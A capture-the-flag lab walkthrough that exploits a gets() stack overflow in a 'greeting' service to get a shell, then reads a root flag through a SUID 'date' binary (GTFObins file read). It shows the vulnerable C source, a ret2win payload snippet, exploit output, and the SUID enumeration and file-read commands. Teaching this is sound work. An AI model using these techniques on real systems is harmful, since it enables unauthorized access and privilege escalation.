## A Note On Available Files

This machine uses a custom binary exploitation challenge to allow users to gain user access to the machine. It is recommended that the learner have access to at least the greeting binary in order to reverse engineer it and write an appropriate exploit, but beginners could also be provided with the greeting.c source code to make the process easier.

Students should not view or use exploit.py unless they have consciously decided to start looking at answers.

We would also strongly recommend the use of pwntools, which is a python3 library that can be imported with a simple ``` pip install python3 ``` (some systems may now recommend pipx).

## User Access

To begin with, we can conduct an nmap scan of the machine once the run.sh script has fully provisioned it. This shows a service running on port 4444, which is relatively non-standard:

```
nmap 192.168.56.33
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-14 12:58 EST
Nmap scan report for 192.168.56.33
Host is up (0.0020s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
4444/tcp open  krb524

Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds

```
If we simply connect to the service over netcat, we can see that this seems to be a very simple binary that takes user input and prints it back out to the console.
```
knittingirl@knittingirl-OptiPlex-7060:~$ nc 192.168.56.33 4444
aaaaaaaaaaaaaaaaaaaaaa
Hi! What's your name?

Nice to meet you aaaaaaaaaaaaaaaaaaaaaa
```
If we look at the source code, we can see that there is a very clear path of attack. The program includes a win function that is not normally used by the binary and will spawn a shell, and it also takes input from the user using the "gets" function. Programmers are strongly recommended against using this function since it allows users to read in input of an unlimited length, causing a buffer overflow. In this specific scenario, since the program is reading a string into the buf variable on the stack, a stack overflow is present, and the user can overwrite values higher up on the stack than buf. In particular, the return pointer is stored higher up on the stack, which controls where the program starts executing after the current function completes. If we can set that return address to the win function, we will be able to get a shell (Note: since this is a simple program, you could derive very similar information by decompiling the executable in a reverse engineering tool like Ghidra).

```
#include <stdio.h>
int win(){
	puts("You shouldn't be here");
	system("/bin/sh");
}

int main() {
	char buf [64];
	puts("Hi! What's your name?\n");
	gets(buf);
	printf("Nice to meet you %s\n", buf);
	return 0;
}
```
Two of the main protections that could make this plan of attack harder would be the presence of a canary, which detects stack overflows if they start to approach the return pointer, and PIE, which randomizes addresses in the code section and would make accurately jumping to the win function difficult. Neither are present in this case, which can be checked with the checksec program that ships with pwntools.

```
checksec greeting
[*] '/home/knittingirl/Desktop/CyberCompetition-Example-Labs/Pwnable_Linux/greeting'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
Note: If this explanation is going to fast, here is an older writeup that Caitlin did on a similar challenge [chainmail]<https://github.com/knittingirl/CTF-Writeups/tree/7a329583754b617db407c4262b93ba9422ccee25/pwn_challs/UIUCTF23/Chainmail> 

The exploit, then, has two main components. You first determine the required length of the buffer before the return address; you could do this by simply taking the length of the buf variable, adding 8 to account for the base point to get 72, or you can use the pwntools cyclic string approach set a breakpoint in a debugger at the point where the return address is overwritten, and taking note of that location in the cyclic string. 

You then overwrite the return address. This binary has a stack alignment issue so you cannot jump directly to the win function. The exploit.py example inserts a consequence-free ret instruction to pad the buffer out to a length divisible by 16; an alternative approach would be to jump in part-way through the win instruction in order to sidestep the issue, i.e.:
```
payload = padding  
payload += p64(elf.sym['win']+8)
```
Whatever the approach, once you write and run a working exploit, you get a user shell:
```
python3 exploit.py 
[*] '/home/knittingirl/Desktop/CyberCompetition-Example-Labs/Pwnable_Linux/greeting'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to 192.168.56.33 on port 4444: Done
[*] Switching to interactive mode
$ whoami
greeting_user
$ cat flag.txt
flag{pwn_challs_are_fun}
```

## Root Access

There is also a root-only flag on this machine that cannot be accessed solely by completing the previous step. Within the shell obtained previously, you can search for binaries with the SUID bit set:
```
$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/newgrp
/usr/bin/date
/usr/bin/su
/usr/bin/pkexec
/usr/bin/at
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/sudo
/usr/bin/chfn
```
While most of these binaries are normally SUID, date is not. If we look at the website [GTFObins]<https://gtfobins.github.io/gtfobins/date/>, we can see that date has an entry to allow arbitrary file read in such cases. As a result, we can perform the suggestion on that page to get an arbitrary file read on the expected location of the root flag; please note that this shell does not ordinarily display STDERR output, which is how the flag is displayed in this case, so we redirect STDERR to STDOUT in order to view the file correctly.
```
$ LFILE=/root/root.txt
$ date -f $LFILE 2>&1
date: invalid date ‘flag{suid_bit_works_on_dates}’
```
This is the end of activities for this machine.
